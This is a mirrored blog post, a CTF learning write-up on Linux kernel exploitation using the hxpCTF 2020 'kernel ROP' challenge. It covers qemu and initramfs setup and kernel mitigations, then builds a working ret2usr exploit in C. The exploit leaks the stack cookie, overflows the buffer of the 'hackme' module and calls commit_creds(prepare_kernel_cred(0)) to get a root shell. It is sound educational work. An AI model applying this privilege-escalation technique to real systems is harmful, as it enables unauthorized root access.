---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Learning Linux Kernel Exploitation - Part 1"
subtitle: ""
summary: "The first part of the series about my process of learning Linux kernel exploitation through hxpCTF2020 kernel ROP: Setting up the environment and the simplest technique of ret2usr"
authors: [midas]
tags: []
categories: []
date: 2021-01-23T16:33:12+07:00
lastmod: 2021-01-23T16:33:12+07:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---
**This post is mirrored from its [original post at my blog](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/), some texts/links here maybe broken.**

{{< toc >}}

## Preface
In this series, I'm going to write about some basic stuffs in Linux kernel exploitation that I have learned in the last few weeks: from basic environment setup to some popular Linux kernel mitigations, and their corresponding exploitation techniques. 

Back when I first started playing CTF and pwning about 2 years ago, everytime I heard other people talked about kernel exploitation, it was like a very difficult and magical topic to me, I tried to get into it several times, but always didn't know how to start because I didn't have the sufficient knowledge about kernels and operating systems at that point. A few weeks earlier, after having learned a lot more about computer science in general and operating systems in particular, I decided to try learning kernel pwning again, from the very basic. I know it's pretty late for a pwner like me to start learning this subject after so long, but as they always say, it's better late than never. It turns out that this topic is not as difficult as I have always thought it to be (but for sure it's not easy, remember that this is just the very basics that I have learned), it just requires a lot more initial in-depth knowledge and setup than normal userspace exploitation does. *Therefore, it requires pwners to be quite comfortable with userland exploitation before getting into kernel exploitation*.

For the learning process, I used the environment provided by a challenge from `hxpCTF 2020` called `kernel ROP` to practice on. *Keep in mind that I only used it as a practice environment, this is not an actual writeup of the challenge itself* (even though the environment configuration in the last post may be the same as the challenge, so you can call that a writeup). The reason I chose this particular challenge is because:
1. The configuration is quite standard and easy to modify to my practicing needs.
2. The bug in the kernel module is extremely trivial and basic.
3. The kernel version is quite new (at the time I wrote this post, of course).

For me, this series serves as a reminder, an exploitation template for me to look back on and reuse in the future, but if it could help someone on their first steps into Linux kernel exploitation for just a little bit, I would be very delighted.

So let's start the first post of the series, where I demonstrate the most basic way to setup a Linux kernel pwn environment, and the most basic exploitation technique.

{{% callout %}}
*Use the table of contents on the right to navigate to the section that you are interested in.*
{{% /callout %}}

## Setting up the environment

### First look
For a Linux kernel pwn challenge, our task is to exploit **a vulnearable custom kernel module** that is installed into the kernel on boot. In most cases, the module will be given along with some files that ultimately use `qemu` as the emulator for a Linux system. However in some rare cases, we might be given with a `VMWare` or `VirtualBox` VM image, or might not be given any emulation environment at all, but according to all the challenges that I have sampled, those are quite rare, so I will only explain the common cases, which are emulated by `qemu`.

In particular, for the `kernel ROP` challenge, we are given a lot of files, but only these files are important for the `qemu` setup:

- [vmlinuz](vmlinuz) - the compressed Linux kernel, sometimes it's called `bzImage`, we can extract it into the actual kernel ELF file called `vmlinux`.
- [initramfs.cpio.gz](initramfs.cpio.gz) - the Linux file system that is compressed with `cpio` and `gzip`, directories such as `/bin`, `/etc`, ... are stored in this file, also the vulnearable kernel module is likely to be included in the file system as well. For other challenges, this file might come in some other compression schemes.
- [run.sh](run.sh) - the shell script that contains `qemu` run command, we can change the `qemu` and Linux boot configuration here.

Let's take a deeper look at each of these files to find out what we should do with them, one by one.

### The kernel
The Linux kernel, which is often given under the name of [vmlinuz](vmlinuz) or `bzImage`, is the compressed version of the kernel image called `vmlinux`. There can be some different compression schemes that are used like `gzip`, `bzip2`, `lzma`, etc. Here I used a script called [extract-image.sh](extract-image.sh) to extract the kernel ELF file:
```bash
$ ./extract-image.sh ./vmlinuz > vmlinux
```

The reason for extracting the kernel image is to find `ROP gadgets` inside it. If you are already familiar with userland pwning, you know what `ROP` is, and in the kernel, it's not much different (we will see in later posts). I personally prefer using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to do the job:
```bash
$ ROPgadget --binary ./vmlinux > gadgets.txt
```

Keep in mind that unlike a simple userland program, the kernel image is **HUGE**. Therefore, `ROPgadget` will take a very long time finding all the gadgets and you have to just wait for it, so it is wise to immediately look for gadgets at the beginning of the pwning process. It is also wise to save the output into a file, you don't want to run `ROPgadget` multiple times to look for multiple different gadgets.

### The file system
Again, this is a compressed file, I use this script [decompress.sh](decompress.sh) to decompress the file:
```bash
mkdir initramfs
cd initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm < ./initramfs.cpio
rm initramfs.cpio
```

After running the script, we have a directory `initramfs` which looks like the root directory of a file system on a Linux machine. We can also see that in this case, the vulnearable kernel module [hackme.ko](hackme.ko) is also included in the root directory, we will copy it to somewhere else to analyze later.

The reason we decompress this file is not only to get the vulnearable module, but also to modify something in this file system to our need. Firstly, we can look into `/etc` directory, because most of the init scripts that are run after booting is stored here. In particular, we look for the following line in one of the files (usually it will be `rcS` or `inittab`) and then modify it:
```bash
setuidgid 1000 /bin/sh
# Modify it into the following
setuidgid 0 /bin/sh
``` 

The purpose of this line is to spawn a **non-root shell** with UID `1000` after booting. After modifying the UID to `0`, we will have a **root shell** on startup. You may ask: *why should we do this?* Indeed, this seems quite contradictory, because our goal is to exploit the kernel module to gain root, not to modify the file system (of course we cannot modify the file system on the challenge's remote server). The ultimate reason here is just to simplify the exploitation process. There are some files that contain useful information for us when developing the exploitation code, but they require root access to read, for example:
- `/proc/kallsyms` lists all the addresses of all symbols loaded into the kernel.
- `/sys/module/core/sections/.text` shows the address of kernel `.text` section, which is also its base address (even though in the case of this challenge, there is no such `/sys` directory, you can still retrieve the base address from `/proc/kallsyms` though).

{{< callout >}}
*Remember to set this back to **1000** when running the exploitation code, to avoid false positive while exploiting (you may think you have a root shell after exploiting, but you don't).*
{{< /callout >}}

Secondly, we decompress the file system to put our exploitation program into it later. After modifying it, I use this script [compress.sh](compress.sh) to compress it back into the given format:
```bash
gcc -o exploit -static $1
mv ./exploit ./initramfs
cd initramfs
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
```

The first 2 lines are to compile the exploitation code and put it into the file system.

### The qemu run script
Initially, the given [run.sh](run.sh) looks like this:
```bash
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```

Some notable flags are:
- `-m` specifies the memory size, if for some reasons you cannot boot the emulator, you can try increase this size.
- `-cpu` specifies the CPU model, here we can add `+smep` and `+smap` for SMEP and SMAP mitigation features (more on this later).
- `-kernel` specifies the compressed kernel image.
- `-initrd` specifies the compressed file system.
- `-append` specifies additional boot options, this is also where we can enable/disable mitigation features.
- All the other options can be found in the [QEMU documentation](https://manpages.debian.org/jessie/qemu-system-x86/qemu-system-x86_64.1.en.html).

{{% callout %}}
*This challenge uses `-hdb` to put `flag.txt` into `/dev/sda` instead of leaving the `flag.txt` as a normal file in the system. This is to prevent some dirty CTF tricks used by pwners.*
{{% /callout %}}

The first thing that should be done here is to add `-s` option to it. This options allows us to debug the emulator's kernel remotely from our host machine. All we need to do is to boot the emulator up like normal, then in the host machine, run:
```bash
$ gdb vmlinux
(gdb) target remote localhost:1234
```

Then, we can debug the system's kernel normally, just like when we attach `gdb` to a normal userland process.

{{% callout %}}
*You might want to disable `peda`, `pwndbg` or `GEF` when debugging remote kernel, because sometimes they might behave weirdly. Simply use `gdb --nx vmlinux`.*
{{% /callout %}}

The second thing we can do is modify the mitigation features to our practice needs. Of course, when facing a real challenge in a CTF, we may not want to do this, but again, this is me practicing different exploitation techniques in different scenarios, so modifying them is perfectly fine.

## Linux kernel mitigation features
Just like mitigation features such as `ASLR`, `stack canaries`, `PIE`, etc. used by userland programs, kernel also have their own set of mitigation features. Below are some of the popular and notable Linux kernel mitigation features that I consider when learning kernel pwn:
- [Kernel stack cookies (or canaries)](http://www.phrack.org/issues/49/14.html#article) - this is exactly the same as stack canaries on userland. It is enabled in the kernel at compile time and cannot be disabled.
- [Kernel address space layout randomization (KASLR)](https://lwn.net/Articles/569635/) - also like `ASLR` on userland, it randomizes the base address where the kernel is loaded each time the system is booted. It can be enabled/disabled by adding `kaslr` or `nokaslr` under `-append` option.
- [Supervisor mode execution protection (SMEP)](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf) - this feature marks all the userland pages in the page table as non-executable when the process is in kernel-mode. In the kernel, this is enabled by setting the `20th bit` of Control Register `CR4`. On boot, it can be enabled by adding `+smep` to `-cpu`, and disabled by adding `nosmep` to `-append`.
- [Supervisor Mode Access Prevention (SMAP)](https://lwn.net/Articles/517475/) - complementing `SMEP`, this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well. In the kernel, this is enabled by setting the `21st bit` of Control Register `CR4`. On boot, it can be enabled by adding `+smap` to `-cpu`, and disabled by adding `nosmap` to `-append`.
- [Kernel page-table isolation (KPTI)](https://lwn.net/Articles/741878/) - when this feature is active, the kernel separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contains both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a *minimal set of kernel-space addresses*. It can be enabled/disabled by adding `kpti=1` or `nopti` under `-append` option.

The way I learned, I started out with the least mitigation features enabled: only `stack cookies`, then gradually adding each of them one-by-one in order to learn different techniques that I can use in different cases. But first, let's analyze the vulnearable [hackme.ko](hackme.ko) module itself.

## Analyzing the kernel module
The module is absolutely simple. First, in `hackme_init()`, it registers a device named `hackme` with the following operations: `hackme_read`, `hackme_write`, `hackme_open` and `hackme_release`. This means that we can communicate with this module by opening `/dev/hackme` and perform read or write on it.

Performing read or write on the device will make a call to `hackme_read()` or `hackme_write()` in the kernel, their code is as follow (using IDA pro, some irrelevant parts are omitted):
```C
ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
{   
    //...
    int tmp[32];
    //...
    if ( _size > 0x1000 )
    {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
        BUG();
    }
    _check_object_size(hackme_buf, _size, 0LL);
    if ( copy_from_user(hackme_buf, data, v5) )
        return -14LL;
    _memcpy(tmp, hackme_buf);
    //...
}

ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
{   
    //...
    int tmp[32];
    //...
    _memcpy(hackme_buf, tmp);
    if ( _size > 0x1000 )
    {
        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
        BUG();
    }
    _check_object_size(hackme_buf, _size, 1LL);
    v6 = copy_to_user(data, hackme_buf, _size) == 0;
    //...
}
```

The bugs in these 2 functions are pretty clear: They both read/write to a stack buffer that is 0x80 bytes in length, but only alert a buffer overflow if the size is larger than 0x1000. Using this bug, we can freely read from/write to the kernel stack.

Now, let's see what we can do with the above primitives to achieve root privileges, starting with the least mitigation features possible: only `stack cookies`.

## The simplest exploit - ret2usr
### Concept
Recall when we first learn userland pwn, most of us may have done a simple stack buffer overflow challenge where `ASLR` is disabled and `NX` bit is not set. In such case, what we actually did was using a technique calls `ret2shellcode`, where we put our shellcode somewhere on the stack, then debug to find out its address and overwrite the return address of the current function with what we found.

**Return-to-user** - a.k.a. `ret2usr` - originates from a pretty similar idea. Here, instead of putting a shellcode on the stack, because we have full control of what presents in the `userland`, we can put the piece of code which we want the program's flow to jump into in the `userland` itself. After that, we simply overwrite the return address of the function that is being called in the kernel with that address. Because the vulnearable function is a kernel function, our code - even though being in the `userland` - is executed under `kernel-mode`. By this way, we have already achieved arbitrary code execution.

In order for this technique to work, we will remove most of the mitigation features in the `qemu` run script by removing `+smep`, `+smap`, `kpti=1`, `kaslr` and adding `nopti`, `nokaslr`.

Since this is the first technique in the series, I will explain the exploitation process step by step.

### Opening the device
First of all, before we can interact with the module, we have to open it first. The function to open the device is as simple as open a normal file:
```C
int global_fd;

void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
        puts("[*] Opened device");
    }
}
```

After doing this, we can now read and write to `global_fd`.

### Leaking stack cookies
Because we have arbitrary stack read, leaking is trivial. The `tmp` buffer on the stack itself is 0x80 bytes long, and the stack cookie is immediately after it. Therefore, if we read the data to a `unsigned long` array (of which each element is 8 bytes), the cookie will be at offset 16:
```C
unsigned long cookie;

void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak));
    cookie = leak[16];

    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}
```

### Overwriting return address
The situation here is the same as leaking, we will create an `unsigned long` array, then overwrite the cookie with our leaked cookie at index 16. The important thing to note here is that different from `userland` programs, this kernel function actually pops 3 registers from the stack, namely `rbx`, `r12`, `rbp` instead of just `rbp` (this can clearly be seen in the disassembly of the functions). Therefore, we have to put 3 dummy values after the cookie. Then the next value will be the return address that we want our program to return into, which is the function that we will craft on the `userland` to achieve root privileges, I called it `escalate_privs`:
```C
void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret

    puts("[*] Prepared payload");
    ssize_t w = write(global_fd, payload, sizeof(payload));

    puts("[!] Should never be reached");
}
```
The final concern here is what do we actually write in that function to achieve root privileges.

### Getting root privileges
Again, just as a reminder, our goal in kernel exploitation is not to pop a shell via `system("/bin/sh")` or `execve("/bin/sh", NULL, NULL)`, but it is to achieve root privileges in the system, then pop a root shell. Typically, the most common way to do this is by using the 2 functions called `commit_creds()` and `prepare_kernel_cred()`, which are functions that already reside in the kernel-space code itself. What we need to do is to call the 2 functions like this:
```C
commit_creds(prepare_kernel_cred(0))
```

Since `KASLR` is disabled, the addresses where these functions reside in is constant across every boot. Therefore, we can just easily get those addresses by reading `/proc/kallsyms` file using these shell commands:
```bash
cat /proc/kallsyms | grep commit_creds
-> ffffffff814c6410 T commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
-> ffffffff814c67f0 T prepare_kernel_cred
```

Then the code to achieve root privileges can be written as follows (you can write it in many different ways, it's just simply calling 2 functions consecutively using one's return value as the other's parameter, I just saw this in a writeup and copied it):
```C
void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        ...
        ".att_syntax;"
    );
}
```

{{% callout %}}
*You can take note of the way I write the code, it is a very clean way of writing in-line assembly in C code using `intel syntax`.*
{{% /callout %}}

### Returning to userland
At the current state of the exploitation, if you simply return to a `userland` piece of code to pop a shell, you will be disappointed. The reason is because after running the above code, we are still executing in `kernel-mode`. In order to open a root shell, we have to return to `user-mode`. 

Basically, if the kernel runs normally, it will return to userland using 1 of these instructions (in x86_64): `sysretq` or `iretq`. The typical way that most people use is through `iretq`, because as far as I know, `sysretq` is more complicated to get right. The `iretq` instruction just requires the stack to be setup with **5 userland register values** in this order: `RIP|CS|RFLAGS|SP|SS`.

The process keeps track of 2 different sets of values for these registers, one for `user-mode` and one for `kernel-mode`. Therefore, after finishing executing in `kernel-mode`, it must revert back to the `user-mode` values for these registers. For `RIP`, we can simply set this to be the address of the function that pops a shell. However, for the other registers, if we just set them to be something random, the process may not continue execution as expected. To solve this problem, people have thought of a very clever way: *save the state of these registers before going into kernel-mode, then reload them after gaining root privileges*. The function to save their states is as follow:
```C
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}
```

And one more thing, on x86_64, one more instruction called `swapgs` must be called before `iretq`. The purpose of this instruction is to also swap the `GS` register between `kernel-mode` and `user-mode`. With all those information, we can finish the code to gain root privileges, then return to `user-mode`:
```C
unsigned long user_rip = (unsigned long)get_shell;

void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
        "xor rdi, rdi;"
	    "call rax; mov rdi, rax;"
	    "movabs rax, 0xffffffff814c6410;" //commit_creds
	    "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}
```

We can finally call those pieces that we have crafted one by one, in the correct order, to open a root shell:
```C
int main() {
    save_state();
    open_dev();
    leak();
    overflow();  
    puts("[!] Should never be reached");
    return 0;
}
```

## Conclusion
So that concludes my first post on my Linux kernel exploitation learning process. In this post, I have demonstrated the way to setup the environment for a Linux kernel pwn challenge, and also the simplest technique in kernel exploitation: `ret2usr`. 

In the next post, I will gradually increase the difficulty adding more and more mitigations, and show you the corresponding technique to bypass them.

## Appendix
The full `ret2usr` exploitation script is [ret2usr.c](ret2usr.c).
